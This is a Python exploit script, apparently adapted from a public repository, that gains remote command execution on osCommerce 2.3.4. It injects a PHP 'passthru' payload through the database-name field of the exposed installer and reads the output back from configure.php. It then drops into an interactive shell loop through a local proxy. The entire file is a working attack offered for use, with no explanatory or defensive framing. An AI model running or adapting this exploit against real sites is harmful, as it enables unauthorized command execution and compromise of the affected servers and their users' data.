#!/usr/bin/env python3
# https://github.com/nobodyatall648/osCommerce-2.3.4-Remote-Command-Execution/blob/main/osCommerce2_3_4RCE.py
# - Added proxy support and argparse
import requests
import sys
import argparse

def parse_args():
    parser = argparse.ArgumentParser(description="osCommerce 2.3.4 RCE Exploit")
    parser.add_argument("-u", "--url", required=True, help="Target base URL (e.g., http://target-url/oscommerce-2.3.4/catalog)")
    return parser.parse_args()

def rce(command, baseUrl, proxies):
    targetUrl = baseUrl + '/install/install.php?step=4'

    payload = "');passthru('" + command + "');/*"

    data = {
        'DIR_FS_DOCUMENT_ROOT': './',
        'DB_DATABASE': payload
    }

    response = requests.post(targetUrl, data=data, proxies=proxies, verify=False)

    if response.status_code == 200:
        readCMDUrl = baseUrl + '/install/includes/configure.php'
        cmd = requests.get(readCMDUrl, proxies=proxies, verify=False)

        if cmd.status_code == 200:
            commandRsl = cmd.text.split('\n')
            for line in commandRsl[2:]:
                print(line)
        else:
            return '[!] configure.php not found'
    else:
        return '[!] Failed to inject payload'

def main():
    args = parse_args()
    baseUrl = args.url
    proxies = {
        "http": "http://localhost:8080",
        "https": "http://localhost:8080"
    }

    testVulnUrl = baseUrl + '/install/install.php'
    test = requests.get(testVulnUrl, proxies=proxies, verify=False)

    if test.status_code == 200:
        print('[*] Install directory still available, the host likely vulnerable to the exploit.')
        print('[*] Testing injecting system command to test vulnerability')
        print('User: ', end='')
        err = rce("whoami", baseUrl, proxies)

        if err:
            print(err)
            sys.exit(1)

        while True:
            cmd = input('RCE_SHELL$ ')
            err = rce(cmd, baseUrl, proxies)
            if err:
                print(err)
                sys.exit(1)
    else:
        print('[!] Install directory not found, the host is not vulnerable')
        sys.exit(1)

if __name__ == "__main__":
    main()